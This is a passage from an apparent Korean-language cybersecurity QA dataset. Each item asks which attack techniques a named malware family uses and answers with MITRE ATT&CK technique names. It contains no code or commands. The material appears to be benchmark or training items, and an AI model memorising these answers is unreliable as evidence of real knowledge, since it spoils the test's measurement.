          "Match Legitimate Resource Name or Location",
          "Ingress Tool Transfer",
          "Registry Run Keys / Startup Folder",
          "System Time Discovery"
        ]
      }
    },
    {
      "question": "yty 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "yty는 System Network Configuration Discovery, Software Packing, Screen Capture 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "yty",
        "attack_patterns": [
          "System Network Configuration Discovery",
          "Software Packing",
          "Screen Capture",
          "Keylogging",
          "System Information Discovery",
          "System Owner/User Discovery",
          "Process Discovery",
          "System Checks",
          "Data from Local System",
          "Remote System Discovery",
          "Junk Code Insertion",
          "Scheduled Task",
          "Bidirectional Communication",
          "File and Directory Discovery",
          "Local Storage Discovery"
        ]
      }
    },
    {
      "question": "Backdoor.Oldrea 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Backdoor.Oldrea는 System Information Discovery, Remote System Discovery, System Owner/User Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Backdoor.Oldrea",
        "attack_patterns": [
          "System Information Discovery",
          "Remote System Discovery",
          "System Owner/User Discovery",
          "File and Directory Discovery",
          "Process Discovery",
          "Credentials from Web Browsers",
          "Archive Collected Data",
          "Email Account",
          "Ingress Tool Transfer",
          "Standard Encoding",
          "Process Injection",
          "Rundll32",
          "System Network Configuration Discovery",
          "File Deletion",
          "Network Service Discovery",
          "Registry Run Keys / Startup Folder"
        ]
      }
    },
    {
      "question": "DOGCALL 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "DOGCALL는 Audio Capture, Bidirectional Communication, Encrypted/Encoded File 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "DOGCALL",
        "attack_patterns": [
          "Audio Capture",
          "Bidirectional Communication",
          "Encrypted/Encoded File",
          "Screen Capture",
          "Ingress Tool Transfer",
          "Keylogging"
        ]
      }
    },
    {
      "question": "Stuxnet 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Stuxnet는 Taint Shared Content, SQL Stored Procedures, Internal Proxy 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Stuxnet",
        "attack_patterns": [
          "Taint Shared Content",
          "SQL Stored Procedures",
          "Internal Proxy",
          "Remote Services",
          "Native API",
          "Lateral Tool Transfer",
          "Scheduled Task",
          "Code Signing",
          "Network Share Discovery",
          "System Time Discovery",
          "Domain Accounts",
          "Query Registry",
          "SMB/Windows Admin Shares",
          "Impair Defenses",
          "Local Account",
          "Exploitation for Privilege Escalation",
          "Security Software Discovery",
          "Default Accounts",
          "Peripheral Device Discovery",
          "Domain Account",
          "Fallback Channels",
          "File and Directory Discovery",
          "Rootkit",
          "Web Protocols",
          "Indicator Removal",
          "Dynamic-link Library Injection",
          "Exfiltration Over C2 Channel",
          "Symmetric Cryptography",
          "Execution Guardrails",
          "Replication Through Removable Media",
          "Encrypted/Encoded File",
          "Exploitation of Remote Services",
          "Token Impersonation/Theft",
          "File Deletion",
          "Windows Service",
          "Deobfuscate/Decode Files or Information",
          "Modify Registry",
          "Shared Modules",
          "Windows Management Instrumentation",
          "Timestomp",
          "Archive via Custom Method",
          "Standard Encoding",
          "System Information Discovery",
          "System Network Configuration Discovery"
        ]
      }
    },
    {
      "question": "Downdelph 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Downdelph는 DLL, Ingress Tool Transfer, Symmetric Cryptography 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Downdelph",
        "attack_patterns": [
          "DLL",
          "Ingress Tool Transfer",
          "Symmetric Cryptography",
          "Bypass User Account Control",
          "Junk Data"
        ]
      }
    },
    {
      "question": "RotaJakiro 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "RotaJakiro는 Symmetric Cryptography, Exfiltration Over C2 Channel, XDG Autostart Entries 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "RotaJakiro",
        "attack_patterns": [
          "Symmetric Cryptography",
          "Exfiltration Over C2 Channel",
          "XDG Autostart Entries",
          "Inter-Process Communication",
          "Automated Collection",
          "Process Discovery",
          "Match Legitimate Resource Name or Location",
          "Non-Application Layer Protocol",
          "Non-Standard Port",
          "Shared Modules",
          "Systemd Service",
          "System Information Discovery",
          "Boot or Logon Initialization Scripts",
          "Standard Encoding",
          "Native API",
          "Unix Shell Configuration Modification",
          "Deobfuscate/Decode Files or Information"
        ]
      }
    },
    {
      "question": "AvosLocker 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "AvosLocker는 System Shutdown/Reboot, Process Discovery, System Time Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "AvosLocker",
        "attack_patterns": [
          "System Shutdown/Reboot",
          "Process Discovery",
          "System Time Discovery",
          "Obfuscated Files or Information",
          "Safe Mode Boot",
          "Network Share Discovery",
          "Service Stop",
          "Hidden Window",
          "Masquerade File Type",
          "File and Directory Discovery",
          "Dynamic API Resolution",
          "Deobfuscate/Decode Files or Information",
          "Registry Run Keys / Startup Folder",
          "Data Encrypted for Impact",
          "Native API"
        ]
      }
    },
    {
      "question": "SEASHARPEE 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "SEASHARPEE는 Web Shell, Windows Command Shell, Timestomp 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "SEASHARPEE",
        "attack_patterns": [
          "Web Shell",
          "Windows Command Shell",
          "Timestomp",
          "Ingress Tool Transfer"
        ]
      }
    },
    {
      "question": "Get2 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Get2는 Web Protocols, System Owner/User Discovery, Command and Scripting Interpreter 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Get2",
        "attack_patterns": [
          "Web Protocols",
          "System Owner/User Discovery",
          "Command and Scripting Interpreter",
          "System Information Discovery",
          "Process Discovery",
          "Dynamic-link Library Injection"
        ]
      }
    },
    {
      "question": "POWRUNER 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "POWRUNER는 Screen Capture, Scheduled Task, System Network Connections Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "POWRUNER",
        "attack_patterns": [
          "Screen Capture",
          "Scheduled Task",
          "System Network Connections Discovery",
          "Query Registry",
          "Ingress Tool Transfer",
          "Standard Encoding",
          "PowerShell",
          "Windows Command Shell",
          "System Information Discovery",
          "File and Directory Discovery",
          "Domain Account",
          "Domain Groups",
          "System Owner/User Discovery",
          "Security Software Discovery",
          "Local Groups",
          "DNS",
          "Process Discovery",
          "Windows Management Instrumentation",
          "Web Protocols",
          "System Network Configuration Discovery"
        ]
      }
    },
    {
      "question": "KOPILUWAK 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "KOPILUWAK는 System Owner/User Discovery, Local Data Staging, Data from Local System 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "KOPILUWAK",
        "attack_patterns": [
          "System Owner/User Discovery",
          "Local Data Staging",
          "Data from Local System",
          "JavaScript",
          "Spearphishing Attachment",
          "System Network Connections Discovery",
          "Local Storage Discovery",
          "Exfiltration Over C2 Channel",
          "System Network Configuration Discovery",
          "Network Share Discovery",
          "Process Discovery",
          "Malicious File",
          "Web Protocols"
        ]
      }
    },
    {
      "question": "RobbinHood 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "RobbinHood는 Windows Command Shell, Data Encrypted for Impact, Disable or Modify Tools 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "RobbinHood",
        "attack_patterns": [
          "Windows Command Shell",
          "Data Encrypted for Impact",
          "Disable or Modify Tools",
          "Network Share Connection Removal",
          "Service Stop",
          "Inhibit System Recovery"
        ]
      }
    },
    {
      "question": "MEDUSA 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "MEDUSA는 Dynamic Linker Hijacking, Rootkit, Encrypted/Encoded File 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "MEDUSA",
        "attack_patterns": [
          "Dynamic Linker Hijacking",
          "Rootkit",
          "Encrypted/Encoded File",
          "SSH Hijacking"
        ]
      }
    },
    {
      "question": "VersaMem 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "VersaMem는 Shared Modules, Network Sniffing, Local Data Staging 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "VersaMem",
        "attack_patterns": [
          "Shared Modules",
          "Network Sniffing",
          "Local Data Staging",
          "Command and Scripting Interpreter",
          "File Deletion",
          "Encrypted/Encoded File",
          "Exploitation for Client Execution",
          "Credential API Hooking"
        ]
      }
    },
    {
      "question": "Power Loader 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Power Loader는 Extra Window Memory Injection 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Power Loader",
        "attack_patterns": [
          "Extra Window Memory Injection"
        ]
      }
    },
    {
      "question": "TDTESS 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "TDTESS는 Windows Service, Timestomp, Windows Command Shell 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "TDTESS",
        "attack_patterns": [
          "Windows Service",
          "Timestomp",
          "Windows Command Shell",
          "Ingress Tool Transfer",
          "File Deletion"
        ]
      }
    },
    {
      "question": "Chinoxy 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Chinoxy는 Match Legitimate Resource Name or Location, Encrypted/Encoded File, Registry Run Keys / Startup Folder 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Chinoxy",
        "attack_patterns": [
          "Match Legitimate Resource Name or Location",
          "Encrypted/Encoded File",
          "Registry Run Keys / Startup Folder",
          "Deobfuscate/Decode Files or Information",
          "DLL"
        ]
      }
    },
    {
      "question": "SharpStage 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "SharpStage는 System Language Discovery, Windows Management Instrumentation, Deobfuscate/Decode Files or Information 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "SharpStage",
        "attack_patterns": [
          "System Language Discovery",
          "Windows Management Instrumentation",
          "Deobfuscate/Decode Files or Information",
          "System Information Discovery",
          "Ingress Tool Transfer",
          "PowerShell",
          "Screen Capture",
          "Web Service",
          "Registry Run Keys / Startup Folder",
          "Windows Command Shell",
          "Scheduled Task"
        ]
      }
    },
    {
      "question": "PAKLOG 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "PAKLOG는 System Time Discovery, Process Discovery, DLL 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "PAKLOG",
        "attack_patterns": [
          "System Time Discovery",
          "Process Discovery",
          "DLL",
          "Application Window Discovery",
          "Local Data Staging",
          "Code Signing",
          "Native API",
          "Clipboard Data",
          "Keylogging",
          "Encrypted/Encoded File"
        ]
      }
    },
    {
      "question": "COATHANGER 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "COATHANGER는 Obfuscated Files or Information, Deobfuscate/Decode Files or Information, Hidden Files and Directories 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "COATHANGER",
        "attack_patterns": [
          "Obfuscated Files or Information",
          "Deobfuscate/Decode Files or Information",
          "Hidden Files and Directories",
          "Web Protocols",
          "Hijack Execution Flow",
          "Software Packing",
          "Asymmetric Cryptography",
          "Dynamic Linker Hijacking",
          "Rootkit",
          "Linux and Mac File and Directory Permissions Modification",
          "File and Directory Discovery",
          "Exploit Public-Facing Application",
          "Unix Shell",
          "Process Injection",
          "Launch Daemon",
          "Non-Application Layer Protocol",
          "Process Discovery",
          "File Deletion"
        ]
      }
    },
    {
      "question": "Sardonic 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Sardonic는 Non-Application Layer Protocol, Asynchronous Procedure Call, System Network Connections Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Sardonic",
        "attack_patterns": [
          "Non-Application Layer Protocol",
          "Asynchronous Procedure Call",
          "System Network Connections Discovery",
          "PowerShell",
          "Obfuscated Files or Information",
          "Asymmetric Cryptography",
          "Reflective Code Loading",
          "Indicator Removal",
          "Standard Encoding",
          "System Service Discovery",
          "Native API",
          "Process Discovery",
          "Non-Standard Port",
          "Local Storage Discovery",
          "Windows Command Shell",
          "Deobfuscate/Decode Files or Information",
          "Data from Local System",
          "Network Share Discovery",
          "Ingress Tool Transfer",
          "Windows Management Instrumentation Event Subscription",
          "Symmetric Cryptography",
          "System Network Configuration Discovery",
          "System Information Discovery",
          "Windows Management Instrumentation",
          "Command Obfuscation"
        ]
      }
    },
    {
      "question": "Smoke Loader 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Smoke Loader는 File and Directory Discovery, Scheduled Task, Process Injection 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Smoke Loader",
        "attack_patterns": [
          "File and Directory Discovery",
          "Scheduled Task",
          "Process Injection",
          "Encrypted/Encoded File",
          "Process Hollowing",
          "Registry Run Keys / Startup Folder",
          "Ingress Tool Transfer",
          "Web Protocols",
          "Credentials from Web Browsers",
          "Visual Basic",
          "System Checks",
          "Local Email Collection",
          "Credentials In Files",
          "Deobfuscate/Decode Files or Information"
        ]
      }
    },
    {
      "question": "HALFBAKED 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "HALFBAKED는 System Information Discovery, File Deletion, PowerShell 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "HALFBAKED",
        "attack_patterns": [
          "System Information Discovery",
          "File Deletion",
          "PowerShell",
          "Screen Capture",
          "Windows Management Instrumentation",
          "Process Discovery"
        ]
      }
    },
    {
      "question": "WindTail 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "WindTail는 System Time Discovery, Hidden Window, Exfiltration Over Unencrypted Non-C2 Protocol 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "WindTail",
        "attack_patterns": [
          "System Time Discovery",
          "Hidden Window",
          "Exfiltration Over Unencrypted Non-C2 Protocol",
          "File Deletion",
          "Deobfuscate/Decode Files or Information",
          "Archive via Utility",
          "Masquerading",
          "Automated Collection",
          "Unix Shell",
          "Web Protocols",
          "Compression",
          "Encrypted/Encoded File",
          "File and Directory Discovery",
          "Native API",
          "Invalid Code Signature"
        ]
      }
    },
    {
      "question": "Misdat 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Misdat는 Native API, Timestomp, Software Packing 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Misdat",
        "attack_patterns": [
          "Native API",
          "Timestomp",
          "Software Packing",
          "System Language Discovery",
          "Windows Command Shell",
          "Ingress Tool Transfer",
          "Standard Encoding",
          "Boot or Logon Autostart Execution",
          "System Information Discovery",
          "Clear Persistence",
          "File Deletion",
          "Data from Local System",
          "Non-Application Layer Protocol",
          "Exfiltration Over C2 Channel",
          "File and Directory Discovery",
          "Match Legitimate Resource Name or Location"
        ]
      }
    },
    {
      "question": "reGeorg 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "reGeorg는 Non-Application Layer Protocol, SMB/Windows Admin Shares, Web Shell 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "reGeorg",
        "attack_patterns": [
          "Non-Application Layer Protocol",
          "SMB/Windows Admin Shares",
          "Web Shell",
          "Web Protocols",
          "Proxy",
          "SSH",
          "Remote Desktop Protocol",
          "Ingress Tool Transfer",
          "Protocol Tunneling",
          "Python"
        ]
      }
    },
    {
      "question": "FLIPSIDE 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "FLIPSIDE는 Protocol Tunneling 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "FLIPSIDE",
        "attack_patterns": [
          "Protocol Tunneling"
        ]
      }
    },
    {
      "question": "Linux Rabbit 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Linux Rabbit는 Valid Accounts, Data Encoding, System Owner/User Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Linux Rabbit",
        "attack_patterns": [
          "Valid Accounts",
          "Data Encoding",
          "System Owner/User Discovery",
          "Unix Shell Configuration Modification",
          "External Remote Services",
          "Password Spraying"
        ]
      }
    },
    {
      "question": "adbupd 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "adbupd는 Asymmetric Cryptography, Windows Command Shell, Windows Management Instrumentation Event Subscription 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "adbupd",
        "attack_patterns": [
          "Asymmetric Cryptography",
          "Windows Command Shell",
          "Windows Management Instrumentation Event Subscription"
        ]
      }
    },
    {
      "question": "Emissary 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Emissary는 Windows Service, Binary Padding, System Service Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Emissary",
        "attack_patterns": [
          "Windows Service",
          "Binary Padding",
          "System Service Discovery",
          "Local Groups",
          "Ingress Tool Transfer",
          "Group Policy Discovery",
          "Web Protocols",
          "Symmetric Cryptography",
          "System Information Discovery",
          "Windows Command Shell",
          "System Network Configuration Discovery",
          "Rundll32",
          "Dynamic-link Library Injection",
          "Encrypted/Encoded File",
          "Registry Run Keys / Startup Folder"
        ]
      }
    },
    {
      "question": "Exaramel for Linux 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Exaramel for Linux는 Cron, Encrypted/Encoded File, Unix Shell 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Exaramel for Linux",
        "attack_patterns": [
          "Cron",
          "Encrypted/Encoded File",
          "Unix Shell",
          "Setuid and Setgid",
          "Systemd Service",
          "File Deletion",
          "Deobfuscate/Decode Files or Information",
          "Fallback Channels",
          "Create or Modify System Process",
          "Web Protocols",
          "System Owner/User Discovery",
          "Ingress Tool Transfer"
        ]
      }
    },
    {
      "question": "KEYMARBLE 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "KEYMARBLE는 File Deletion, Symmetric Cryptography, Modify Registry 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "KEYMARBLE",
        "attack_patterns": [
          "File Deletion",
          "Symmetric Cryptography",
          "Modify Registry",
          "Screen Capture",
          "Local Storage Discovery",
          "System Information Discovery",
          "Ingress Tool Transfer",
          "File and Directory Discovery",
          "Windows Command Shell",
          "System Network Configuration Discovery",
          "Process Discovery"
        ]
      }
    },
    {
      "question": "BUBBLEWRAP 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "BUBBLEWRAP는 System Information Discovery, Non-Application Layer Protocol, Web Protocols 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "BUBBLEWRAP",
        "attack_patterns": [
          "System Information Discovery",
          "Non-Application Layer Protocol",
          "Web Protocols"
        ]
      }
    },
    {
      "question": "HAWKBALL 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "HAWKBALL는 Native API, File Deletion, Exploitation for Client Execution 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "HAWKBALL",
        "attack_patterns": [
          "Native API",
          "File Deletion",
          "Exploitation for Client Execution",
          "Windows Command Shell",
          "Archive via Custom Method",
          "Exfiltration Over C2 Channel",
          "System Owner/User Discovery",
          "Web Protocols",
          "System Information Discovery",
          "Encrypted/Encoded File",
          "Dynamic Data Exchange"
        ]
      }
    },
    {
      "question": "TAMECAT 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "TAMECAT는 Web Protocols, PowerShell, Security Software Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "TAMECAT",
        "attack_patterns": [
          "Web Protocols",
          "PowerShell",
          "Security Software Discovery",
          "Symmetric Cryptography",
          "Windows Management Instrumentation",
          "Standard Encoding",
          "Visual Basic",
          "Ingress Tool Transfer",
          "Windows Command Shell"
        ]
      }
    },
    {
      "question": "PS1 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "PS1는 Deobfuscate/Decode Files or Information, Encrypted/Encoded File, PowerShell 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "PS1",
        "attack_patterns": [
          "Deobfuscate/Decode Files or Information",
          "Encrypted/Encoded File",
          "PowerShell",
          "Dynamic-link Library Injection",
          "Ingress Tool Transfer"
        ]
      }
    },
    {
      "question": "Ursnif 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Ursnif는 Replication Through Removable Media, Hidden Window, Taint Shared Content 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Ursnif",
        "attack_patterns": [
          "Replication Through Removable Media",
          "Hidden Window",
          "Taint Shared Content",
          "Browser Session Hijacking",
          "Process Hollowing",
          "Windows Management Instrumentation",
          "Proxy",
          "System Information Discovery",
          "Visual Basic",
          "Domain Generation Algorithms",
          "Query Registry",
          "Modify Registry",
          "File Deletion",
          "Web Protocols",
          "PowerShell",
          "Windows Service",
          "Screen Capture",
          "Command Obfuscation",
          "Data from Local System",
          "Match Legitimate Resource Name or Location",
          "Thread Local Storage",
          "Deobfuscate/Decode Files or Information",
          "Data Encoding",
          "Exfiltration Over C2 Channel",
          "Component Object Model",
          "Process Discovery",
          "Credential API Hooking",
          "Time Based Checks",
          "Native API",
          "Local Data Staging",
          "Multi-hop Proxy",
          "Encrypted/Encoded File",
          "Registry Run Keys / Startup Folder",
          "Ingress Tool Transfer",
          "System Service Discovery"
        ]
      }
    },
    {
      "question": "CASTLETAP 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "CASTLETAP는 Data from Local System, Symmetric Cryptography, Network Sniffing 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "CASTLETAP",
        "attack_patterns": [
          "Data from Local System",
          "Symmetric Cryptography",
          "Network Sniffing",
          "Asymmetric Cryptography",
          "Deobfuscate/Decode Files or Information",
          "Ingress Tool Transfer",
          "Socket Filters",
          "Unix Shell"
        ]
      }
    },
    {
      "question": "ThreatNeedle 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "ThreatNeedle는 Match Legitimate Resource Name or Location, Spearphishing Attachment, Deobfuscate/Decode Files or Information 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "ThreatNeedle",
        "attack_patterns": [
          "Match Legitimate Resource Name or Location",
          "Spearphishing Attachment",
          "Deobfuscate/Decode Files or Information",
          "Modify Registry",
          "Fileless Storage",
          "Encrypted/Encoded File",
          "Data from Local System",
          "Compression",
          "File and Directory Discovery",
          "System Information Discovery",
          "Ingress Tool Transfer",
          "Windows Service",
          "Malicious File",
          "Registry Run Keys / Startup Folder"
        ]
      }
    },
    {
      "question": "RansomHub 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "RansomHub는 System Information Discovery, Service Stop, Network Share Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "RansomHub",
        "attack_patterns": [
          "System Information Discovery",
          "Service Stop",
          "Network Share Discovery",
          "Internal Defacement",
          "Process Discovery",
          "Data Encrypted for Impact",
          "Inhibit System Recovery",
          "File and Directory Discovery",
          "Time Based Checks",
          "SMB/Windows Admin Shares",
          "Deobfuscate/Decode Files or Information",
          "Remote System Discovery",
          "Windows Command Shell",
          "Registry Run Keys / Startup Folder",
          "Encrypted/Encoded File",
          "Execution Guardrails",
          "Clear Windows Event Logs",
          "Safe Mode Boot",
          "Proxy",
          "PowerShell",
          "File Deletion"
        ]
      }
    },
    {
      "question": "ZLib 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "ZLib는 Match Legitimate Resource Name or Location, Web Protocols, Exfiltration Over C2 Channel 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "ZLib",
        "attack_patterns": [
          "Match Legitimate Resource Name or Location",
          "Web Protocols",
          "Exfiltration Over C2 Channel",
          "System Service Discovery",
          "Windows Command Shell",
          "Screen Capture",
          "File and Directory Discovery",
          "Windows Service",
          "System Information Discovery",
          "Archive via Library",
          "Ingress Tool Transfer"
        ]
      }
    },
    {
      "question": "RedLeaves 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "RedLeaves는 Ingress Tool Transfer, Non-Standard Port, Registry Run Keys / Startup Folder 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "RedLeaves",
        "attack_patterns": [
          "Ingress Tool Transfer",
          "Non-Standard Port",
          "Registry Run Keys / Startup Folder",
          "System Network Connections Discovery",
          "File and Directory Discovery",
          "Web Protocols",
          "System Owner/User Discovery",
          "Symmetric Cryptography",
          "System Information Discovery",
          "System Network Configuration Discovery",
          "Windows Command Shell",
          "File Deletion",
          "Encrypted/Encoded File",
          "Screen Capture",
          "DLL",
          "Credentials from Web Browsers",
          "Shortcut Modification"
        ]
      }
    },
    {
      "question": "Miner-C 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Miner-C는 Taint Shared Content 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Miner-C",
        "attack_patterns": [
          "Taint Shared Content"
        ]
      }
    },
    {
      "question": "POWERSOURCE 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "POWERSOURCE는 Ingress Tool Transfer, DNS, NTFS File Attributes 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "POWERSOURCE",
        "attack_patterns": [
          "Ingress Tool Transfer",
          "DNS",
          "NTFS File Attributes",
          "Registry Run Keys / Startup Folder",
          "Query Registry",
          "PowerShell"
        ]
      }
    },
    {
      "question": "LITTLELAMB.WOOLTEA 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "LITTLELAMB.WOOLTEA는 System Information Discovery, File and Directory Discovery, Create or Modify System Process 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "LITTLELAMB.WOOLTEA",
        "attack_patterns": [
          "System Information Discovery",
          "File and Directory Discovery",
          "Create or Modify System Process",
          "Compromise Host Software Binary",
          "Asymmetric Cryptography",
          "Proxy",
          "Non-Application Layer Protocol"
        ]
      }
    },
    {
      "question": "Felismus 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Felismus는 Windows Command Shell, Symmetric Cryptography, Ingress Tool Transfer 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Felismus",
        "attack_patterns": [
          "Windows Command Shell",
          "Symmetric Cryptography",
          "Ingress Tool Transfer",
          "System Network Configuration Discovery",
          "Standard Encoding",
          "System Information Discovery",
          "Security Software Discovery",
          "Web Protocols",
          "System Owner/User Discovery",
          "Match Legitimate Resource Name or Location"
        ]
      }
    },
    {
      "question": "Zeus Panda 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Zeus Panda는 Deobfuscate/Decode Files or Information, File and Directory Discovery, Keylogging 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Zeus Panda",
        "attack_patterns": [
          "Deobfuscate/Decode Files or Information",
          "File and Directory Discovery",
          "Keylogging",
          "Registry Run Keys / Startup Folder",
          "System Information Discovery",
          "Portable Executable Injection",
          "Query Registry",
          "Clipboard Data",
          "Windows Command Shell",
          "Command Obfuscation",
          "Encrypted/Encoded File",
          "File Deletion",
          "Web Protocols",
          "Modify Registry",
          "System Language Discovery",
          "Command and Scripting Interpreter",
          "System Time Discovery",
          "Screen Capture",
          "Ingress Tool Transfer",
          "Process Discovery",
          "Security Software Discovery",
          "PowerShell",
          "Credential API Hooking"
        ]
      }
    },
    {
      "question": "GeminiDuke 악성코드는 어떤 공격 패턴을 사용하는가?",
